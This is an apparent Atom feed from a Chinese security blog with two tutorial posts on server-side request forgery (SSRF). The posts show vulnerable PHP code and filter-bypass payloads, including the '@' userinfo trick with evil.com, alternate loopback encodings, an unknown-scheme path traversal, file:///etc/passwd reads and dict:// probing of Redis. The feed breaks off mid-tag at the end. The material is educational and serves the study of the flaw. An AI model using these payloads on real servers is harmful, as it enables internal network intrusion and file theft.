<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Vulnner</title>
  
  
  <link href="https://vulnner.github.io/atom.xml" rel="self"/>
  
  <link href="https://vulnner.github.io/"/>
  <updated>2022-01-02T11:19:26.196Z</updated>
  <id>https://vulnner.github.io/</id>
  
  <author>
    <name>vulnner</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ssrf漏洞总结-承</title>
    <link href="https://vulnner.github.io/2022/01/02/ssrf%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93-%E6%89%BF/"/>
    <id>https://vulnner.github.io/2022/01/02/ssrf%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93-%E6%89%BF/</id>
    <published>2022-01-02T11:17:52.000Z</published>
    <updated>2022-01-02T11:19:26.196Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>SSRF的绕过，其实和具体的代码实现时密不可分的。比如有的代码会检查<code>url != example.com</code>，限制不能访问<code>example.com</code>，这种最简单的大小写即可绕过。</p><p>虽然绕过与代码实现有着紧密联系，但总结下来，对SSRF的限制大概有如下几种：</p><ul><li>限制域名只能是xxx.com</li><li>限制不能访问内网IP</li><li>限制访问的端口只能是Web端口，只能使用http(s)协议</li></ul><h2 id="二、绕过"><a href="#二、绕过" class="headerlink" title="二、绕过"></a>二、绕过</h2><p>下面来介绍SSRF的各种绕过姿势。</p><h3 id="2-1-基本绕过"><a href="#2-1-基本绕过" class="headerlink" title="2.1 基本绕过"></a>2.1 基本绕过</h3><ol><li><p>利用基本身份认证绕过</p><p>服务端的验证代码可能是：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 检查url是否以http://www.xxx.com开头</span></span><br><span class="line"><span class="comment">// 这里限制只能访问baidu</span></span><br><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strpos(<span class="variable">$url</span>, <span class="string">&quot;http://www.baidu.com&quot;</span>) === <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ivalid url&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    file_get_contents(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过<code>ssrf?url=http://www.baidu.com@evil.com</code>即可绕过限制。</p><p>绕过原因在于，<code>www.baidu.com</code>被<code>file_get_contents()</code>当成了userinfo，<code>@</code>后面的<code>attakcer.com</code>才是真正的host。</p></li></ol><p><img src="/.io//image-20211108221023414.png" alt="image-20211108221023414"></p><ol start="2"><li><p>利用重定向跳转</p><p>针对内网ip的限制，可以利用重定向跳转的方法来进行绕过。主要有两种：</p><ul><li><p>xip.io绕过</p><p>比如代码直接白名单验证是否是内网ip，但验证的有缺陷时。也可以用来绕WAF。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line">    <span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (filter_var( <span class="variable">$host</span>,  FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE|FILTER_FLAG_NO_RES_RANGE)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;禁止外网访问&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$host</span>;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>如果直接输入<code>?host=127.0.0.1</code>，则会显示禁止外网访问；</p><p>但若输入<code>?host=127.0.0.1</code>,则打印<code>$host</code>，成功绕过了内网验证的限制。</p><p>其中，<code>xip.io</code>是一个dns wildcard。它的大致原理如下：</p><img src="/.io//image-20211108224511621.png" alt="image-20211108224511621" style="zoom:60%;"></li><li><p>短链绕过</p><p>通过一些生成短链的网站，将内网地址缩短生成短链，可以用来绕WAF。</p><p>比如在一个短链网站，将<code>http://127.0.0.1/flag.php</code>缩短为<code>https://m1.fit/qy7yx</code>，就可以用这个来绕WAF。</p><img src="/.io//image-20211108225523462.png" alt="image-20211108225523462" style="zoom:67%;"></li></ul></li><li><p>进制转换</p><p>同样的，可以用不同的进制来代替正常的IP地址，进而绕过WAF。网上一搜就有很多脚本。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$ip</span> = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="variable">$ip</span> = explode(<span class="string">&#x27;.&#x27;</span>,<span class="variable">$ip</span>);</span><br><span class="line"><span class="variable">$r</span> = (<span class="variable">$ip</span>[<span class="number">0</span>] &lt;&lt; <span class="number">24</span>) | (<span class="variable">$ip</span>[<span class="number">1</span>] &lt;&lt; <span class="number">16</span>) | (<span class="variable">$ip</span>[<span class="number">2</span>] &lt;&lt; <span class="number">8</span>) | <span class="variable">$ip</span>[<span class="number">3</span>] ;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$r</span> &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="variable">$r</span> += <span class="number">4294967296</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;dec:&quot;</span>;     <span class="comment">// 2130706433</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$r</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;oct:&quot;</span>;     <span class="comment">// 0177.0.0.1</span></span><br><span class="line"><span class="keyword">echo</span> decoct(<span class="variable">$r</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;hex:&quot;</span>;   <span class="comment">// 0x7f.0.0.1</span></span><br><span class="line"><span class="keyword">echo</span> dechex(<span class="variable">$r</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>还有一些其他指向本地的地址，可用来绕过<code>127.0.0.1</code>的黑名单限制：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/         </span><br><span class="line">http://<span class="number">0</span>/                 <span class="comment"># 0在window下代表0.0.0.0，在liunx下代表127.0.0.1</span></span><br><span class="line">http://<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>/       <span class="comment"># 0.0.0.0这个IP地址表示整个网络，可以代表本机 ipv4 的所有地址</span></span><br><span class="line">http://[<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:ffff:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>]/    <span class="comment"># liunx下可用</span></span><br><span class="line">http://[::]:<span class="number">80</span>/           <span class="comment"># liunx下可用</span></span><br><span class="line">http://<span class="number">127</span>。<span class="number">0</span>。<span class="number">0</span>。<span class="number">1</span>/       <span class="comment"># 用中文句号绕过</span></span><br><span class="line">http://<span class="number">127.1</span>/</span><br><span class="line">http://<span class="number">127.00000</span><span class="number">.00000</span><span class="number">.001</span>/ <span class="comment"># 多加一些0</span></span><br><span class="line">http://①②⑦.⓪.⓪.①<span class="comment"># 编码绕过</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="2-2-利用不存在scheme"><a href="#2-2-利用不存在scheme" class="headerlink" title="2.2 利用不存在scheme"></a>2.2 利用不存在scheme</h3><p>主要是用到了<code>file_get_contents()</code>函数，函数定义如下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filename为要读取的文件名，可以使url地址</span></span><br><span class="line"><span class="comment">// 会返回读取到的文件内容，string类型</span></span><br><span class="line">file_get_contents(</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$filename</span>,</span><br><span class="line">    <span class="keyword">bool</span> <span class="variable">$use_include_path</span> = <span class="literal">false</span>,</span><br><span class="line">    resource <span class="variable">$context</span> = ?,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$offset</span> = <span class="number">0</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$length</span> = ?</span><br><span class="line">): <span class="keyword">string</span>|<span class="literal">false</span></span><br></pre></td></tr></table></figure><p>可以直接读取本地的文件内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// If strict types are enabled i.e. declare(strict_types=1);</span></span><br><span class="line"><span class="variable">$file</span> = file_get_contents(<span class="string">&#x27;./people.txt&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="comment">// Otherwise</span></span><br><span class="line"><span class="variable">$file</span> = file_get_contents(<span class="string">&#x27;./people.txt&#x27;</span>, FILE_USE_INCLUDE_PATH);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>也可以读取网页内容并返回：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$homepage</span> = file_get_contents(<span class="string">&#x27;http://www.example.com/&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$homepage</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>file_get_contents()</code>有一个特性，它在遇到未知scheme时，会将这个scheme当做文件夹，进而造成任意文件读取的问题。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^https/is&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;hack&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>例如上面这段测试代码，限制了url必须以https开头，否则就<code>die</code>。</p><p>但根据<code>file_get_contens()</code>的特性，我们可以构造scheme为<code>httpsss://</code>。这个scheme对于该函数来讲，是未知的，所以就会被函数当做文件夹，再配合目录穿越，即可造成任意文件读取。</p><p>这种方法主要是在SSRF时，大多协议被禁止的情况下使用，比如可以用来读取服务端的一些源码/配置文件，进行进一步的漏洞审计。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssrf.php?url=httpsss://../../../../../etc/passwd</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20211109215752183.png" alt="image-20211109215752183"></p><h3 id="2-3-利用不一致性"><a href="#2-3-利用不一致性" class="headerlink" title="2.3 利用不一致性"></a>2.3 利用不一致性</h3><p>众所周知，许多安全问题的原因，在于对安全规范实现的不一致，SSRF的绕过亦如此。下面的内容主要参考了Orange在Blackhat上的演讲<code>《A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages》</code>。(Orange yyds)</p><p>即利用URL Parser和URL Requester解析不一致的问题，进行SSRF的绕过。</p><p>先来看一个简单的例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1.1.1.1 &amp;@2.2.2.2# @3.3.3.3</span><br></pre></td></tr></table></figure><p>对这么一个URL，一些url parser库的解析结果是什么呢？</p><p>结果如下，可以看到它们解析的结果非常不一致。</p><img src="/.io//image-20211109220429068.png" alt="image-20211109220429068" style="zoom:50%;"><ul><li><p>parse_url与readfile解析port差异</p><p>我们可以来看下面这段PHP代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>       <span class="variable">$url</span> = <span class="string">&#x27;http://&#x27;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];    <span class="variable">$parsed</span> = parse_url(<span class="variable">$url</span>);    <span class="keyword">if</span>(<span class="variable">$parsed</span>[<span class="string">&#x27;port&#x27;</span>] == <span class="number">80</span>) &#123;        readfile(<span class="variable">$url</span>);    &#125; <span class="keyword">else</span> &#123;        <span class="keyword">die</span>(<span class="string">&#x27;not pass&#x27;</span>);    &#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>它会校验端口是否是80，不是都话程序就go die。</p><p>在本机8000端口起一个web服务，正常情况下访问<code>127.0.0.1:8000/flag.txt</code>会显示<code>not pass</code>。</p><img src="/.io//image-20211109222249877.png" alt="image-20211109222249877" style="zoom:50%;"><p>而访问<code>ssrf.php?url=127.0.0.1:8000:80</code>，发现成功访问到flag。</p><img src="/.io//image-20211109222224232.png" alt="image-20211109222224232" style="zoom:50%;"><p>原因在于，<code>parse_url</code>和<code>readfile</code>对于<code>127.0.0.1:8000:80</code>的解析不一致。<code>parse_url</code>会把<code>80</code>解析为port，而<code>readfile</code>则是把<code>8000</code>解析为port，从而绕过了端口限制。</p><img src="/.io//image-20211109222446462.png" alt="image-20211109222446462" style="zoom:50%;"></li><li><p>解析host差异</p><p>这两个函数在解析host的时候也存在差异，同样可以利用这个特性来绕过对host的限制。</p><p><code>parse_url</code>解析到的host是<code>#@</code>之前的部分，而<code>readfile</code>解析到的则是<code>#@</code>之后的部分。</p><img src="/.io//image-20211109225815043.png" alt="image-20211109225815043" style="zoom:50%;"><p>此外，<code>cURL</code>和<code>parse_url</code>对host的解析也存在差异。</p><img src="/.io//image-20211109230518582.png" alt="image-20211109230518582" style="zoom:50%;"><p>利用这个特点，对类似下面的代码， 可以据此进行绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>       <span class="variable">$url</span> = <span class="string">&#x27;http://&#x27;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];    <span class="variable">$parsed</span> = parse_url(<span class="variable">$url</span>);var_dump(<span class="variable">$parsed</span>[<span class="string">&#x27;host&#x27;</span>]);    <span class="keyword">if</span>(<span class="variable">$parsed</span>[<span class="string">&#x27;host&#x27;</span>] == <span class="string">&#x27;baidu.com&#x27;</span>) &#123;        <span class="comment">// readfile($url);         $curlobj = curl_init();          curl_setopt($curlobj, CURLOPT_POST, 0);         curl_setopt($curlobj,CURLOPT_URL,$link);         curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);          $result=curl_exec($curlobj);          curl_close($curlobj);          echo $result;    &#125; else &#123;        die(&#x27;not pass&#x27;);    &#125;<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>直接访问非baidu的域名，会提示<code>not pass</code></p><img src="/.io//image-20211109230952781.png" alt="image-20211109230952781" style="zoom:50%;"><p>利用解析的不一致性，访问<code>url=foo@127.0.0.1:8000@baidu.com/flag.txt</code>，<code>parse_url</code>会把<code>baidu.com</code>当做host，而cURL会把<code>127.0.0.1:8000</code>当做host。这样就绕过了限制。</p><img src="/.io//image-20211109231531310.png" alt="image-20211109231531310" style="zoom:50%;"></li></ul><h3 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h3><p><a href="https://zhuanlan.zhihu.com/p/43348582">https://zhuanlan.zhihu.com/p/43348582</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一、简介&quot;&gt;&lt;a href=&quot;#一、简介&quot; class=&quot;headerlink&quot; title=&quot;一、简介&quot;&gt;&lt;/a&gt;一、简介&lt;/h2&gt;&lt;p&gt;SSRF的绕过，其实和具体的代码实现时密不可分的。比如有的代码会检查&lt;code&gt;url != example.com&lt;/co</summary>
      
    
    
    
    
    <category term="Web" scheme="https://vulnner.github.io/tags/Web/"/>
    
    <category term="basic" scheme="https://vulnner.github.io/tags/basic/"/>
    
  </entry>
  
  <entry>
    <title>ssrf漏洞总结-起</title>
    <link href="https://vulnner.github.io/2022/01/02/ssrf%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93-%E8%B5%B7/"/>
    <id>https://vulnner.github.io/2022/01/02/ssrf%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93-%E8%B5%B7/</id>
    <published>2022-01-02T08:07:48.000Z</published>
    <updated>2022-01-02T08:11:01.653Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>SSRF是一个很有趣的漏洞类型，细究起来，它涉及到的知识十分庞杂。关于SSRF的审计、绕过、利用、防御，每一个单拎出来都可以讲上许多。网络上有很多关于SSRF的博客/教程，但很多都比较基础，只是简单介绍了这个漏洞。也有很多关于该漏洞的利用，但它们又都过于分散，只讲了其中的某几个点。</p><p>为了全面而透彻的讲清楚这个漏洞，我打算多写几篇，针对上述的几个方面，进行一个较为细致的讲解。希望能够较为全面的、透彻的总结这个有趣的漏洞。</p><p>本篇主要简单介绍SSRF+SSRF的代码审计，可能会涉及到一部分漏洞利用的知识。但还是有点不太好讲，因为防御、绕过和审计是紧密绑定在一起的。</p></blockquote><p>[toc]</p><h2 id="一、SSRF简介"><a href="#一、SSRF简介" class="headerlink" title="一、SSRF简介"></a>一、SSRF简介</h2><p>SSRF（Server-Side Request Forgery：服务器端请求伪造）是一种由攻击者构造形成，并由服务端发起恶意请求的一个安全漏洞。</p><p>由于恶意请求由服务端发起，而服务端能够请求到与自身相连而与外网隔绝的内部网络系统，所以一般情况下，SSRF的攻击目标是攻击者无法直接访问的内网系统。</p><p>SSRF漏洞的成因则是由于server端提供了从其他服务器获取数据的功能，目标地址用户可控，但服务端未做有效验证。例如，某web应用有一个功能是用户输入URL，服务端从该URL获取网页内容并返回标题给用户。此时攻击者即可将URL改为内网的地址，对内网发起嗅探，为进一步的攻击做准备。</p><ol><li><p>容易出现SSRF的地方有：</p><ul><li>在线翻译：提供一个url，然后翻译对应的网页内容</li><li>图片加载：用户设定头像处，提供图片链接</li><li>图片下载：富文本编辑器中点击下载图片到本地</li><li>转码服务：通过URL把对应网页内容调整为适合手机屏幕浏览</li><li>链接分享渲染：显示链接的标题和部分内容</li><li>网站采集：一些网站会针对输入的url做一些信息采集工作</li><li>数据库内置功能：比如mongodb的copyDatabase函数，clickhouse等</li><li>…</li></ul></li><li><p>SSRF漏洞的危害：</p><ul><li>对外网、服务器所在内进行端口扫描，获取一些服务的banner信息等</li><li>攻击运行在内网的其他应用，如redis、mysql、docker remote api等</li><li>对内网Web应用进行指纹识别，识别企业内部资产信息</li><li>攻击内网Web应用，主要通过HTTP GET/POST可实现的攻击</li><li>通过file协议读取服务器本地文件等</li><li>进行跳板攻击</li></ul></li><li><p>SSRF的分类</p><p>从SSRF的成因来看，主要可以分为如下两类：</p><ul><li><p>直接的socket访问</p><p>套接字(socket)，是对网络通信端点的一种抽象，是支持TCP/IP协议网络通信的基本操作单元，一个套接字就是网络上进程通信的一端，提供了应用层进程利用网络协议交换数据的机制。对于直接的socket访问，可通过CRLF和其他注入来进行protocol smuggling。</p></li><li><p>socket客户端访问</p><p>是指各种编程语言等对网络通信的一种实现比如cURL、lwp、java URI、python requests、golang http等。这是我们最常见，最熟悉的一种SSRF。对于socket客户端，则取决于它所支持的协议。我们主要针对web场景，许多发起请求的客户端只支持http(s)协议；但像cURL这种，则支持file、http(s)、gopher、dict等多种协议。</p></li></ul><blockquote><p>其实还有一种，Web服务器对CL-TE标准不一致导致的protocol smuggle，效果上来看类似SSRF的漏洞。</p></blockquote><p>从SSRF的利用(危害)来看，则主要分为如下两类：</p><ul><li>有回显的SSRF</li><li>无回显的SSRF</li></ul><p>各大漏洞厂商，基本都是根据有无回显来对SSRF进行评级的。</p></li></ol><h2 id="二、初探SSRF"><a href="#二、初探SSRF" class="headerlink" title="二、初探SSRF"></a>二、初探SSRF</h2><h3 id="2-1-SSRF代码审计"><a href="#2-1-SSRF代码审计" class="headerlink" title="2.1 SSRF代码审计"></a>2.1 SSRF代码审计</h3><blockquote><p>主要以PHP为例，其他语言是类似的。</p></blockquote><p>SSRF相关函数主要有：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents();</span><br><span class="line">readfile();</span><br><span class="line">fsockopen();</span><br><span class="line">curl_exec();</span><br><span class="line">fopen();</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p>上述函数使用不当会造成SSRF漏洞，此外，PHP的原生类<code>SoapClient</code>在反序列化时可能会触发SSRF。</p><ul><li><p>file_get_contents()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ssrf.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在上述代码中，<code>file_get_contents()</code>将整个文件或url指向的内容读入到一个字符串中，并返回给用户。</p><p>可进行远程访问baidu：</p></li></ul><img src="/.io//image-20211107215347831.png" alt="image-20211107215347831" style="zoom:50%;"><p>​    也可构造类似<code>ssrf.php?url=../../etc/passwd</code>即可读取服务器端任意文件。</p><img src="/.io//image-20211107215258935-1636293188566.png" alt="image-20211107215258935" style="zoom:50%;"><p>​    <code>readfile()</code>和<code>file_get_contens()</code>类似。</p><ul><li><p>fsockopen()</p><p>该函数用于打开一个网络连接或 Unix domain socket连接，初始化一个socket到指定主机，实现对用户指定url对应数据的获取。主要参数如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fsockopen(</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$hostname</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$port</span> = -<span class="number">1</span>,</span><br><span class="line">    <span class="keyword">int</span> &amp;<span class="variable">$error_code</span> = <span class="literal">null</span>,</span><br><span class="line">    <span class="keyword">string</span> &amp;<span class="variable">$error_message</span> = <span class="literal">null</span>,</span><br><span class="line">    ?<span class="keyword">float</span> <span class="variable">$timeout</span> = <span class="literal">null</span></span><br><span class="line">): resource|<span class="literal">false</span></span><br></pre></td></tr></table></figure><p>该函数会通过socket和服务器建立tcp连接，进行原始的数据传输，并且会返回一个句柄，便于之后被其他函数调用(比如<code>fgets()</code>，<code>fwrite()</code>，<code>fgetss()</code>,<code>fclose()</code>,<code>feof()</code>等。</p><p>问题代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ssrf1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$fp</span> = fsockopen(<span class="variable">$host</span>, <span class="number">80</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)&lt;br /&gt;\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$out</span> = <span class="string">&quot;GET / HTTP/1.1\r\n&quot;</span>;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>;</span><br><span class="line">    fwrite(<span class="variable">$fp</span>, <span class="variable">$out</span>);</span><br><span class="line">    <span class="keyword">while</span> (!feof(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> fgets(<span class="variable">$fp</span>, <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过<code>ssrf1.php?url=www.baidu.com</code>即可访问百度首页。</p><img src="/.io//image-20211107215641671.png" alt="image-20211107215641671" style="zoom:50%;"><p>​    但该函数不能读取本地文件，因为是基于socket直接发送了HTTP协议，除非还存在CRLF等问题能改变请求结构，否则就只支持http协议。</p></li><li><p>curl_exec()</p><p><code>curl_init(url)</code>函数初始化一个新的会话，返回一个cURL句柄，供<code>curl_setopt()</code>，<code>curl_exec()</code>和<code>curl_close() </code>函数使用。</p><p>测试代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ssrf2.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$link</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">  <span class="variable">$curlobj</span> = curl_init(); <span class="comment">// 创建新的 cURL对象</span></span><br><span class="line">  curl_setopt(<span class="variable">$curlobj</span>, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line">  curl_setopt(<span class="variable">$curlobj</span>,CURLOPT_URL,<span class="variable">$link</span>);</span><br><span class="line">  curl_setopt(<span class="variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); <span class="comment">// 设置 URL 和相应的选项</span></span><br><span class="line">  <span class="variable">$result</span>=curl_exec(<span class="variable">$curlobj</span>); <span class="comment">// 抓取 URL 并把它传递给浏览器</span></span><br><span class="line">  curl_close(<span class="variable">$curlobj</span>); <span class="comment">// 关闭 cURL 资源，并且释放系统资源</span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过<code>ssrf2.php?url=www.baidu.com</code>即可访问百度。</p><p>不过由于cURL还支持dict、file、gopher等协议，我们还可以用这些协议来打。</p><p>通过<code>url=dict://localhost:6379/info</code>来查看redis信息。</p><img src="/.io//image-20211107220327347.png" alt="image-20211107220327347" style="zoom:50%;"><p>通过<code>url=file:///etc/passwd</code>来读取服务端文件内容</p></li></ul><img src="/.io//image-20211107220426341.png" alt="image-20211107220426341" 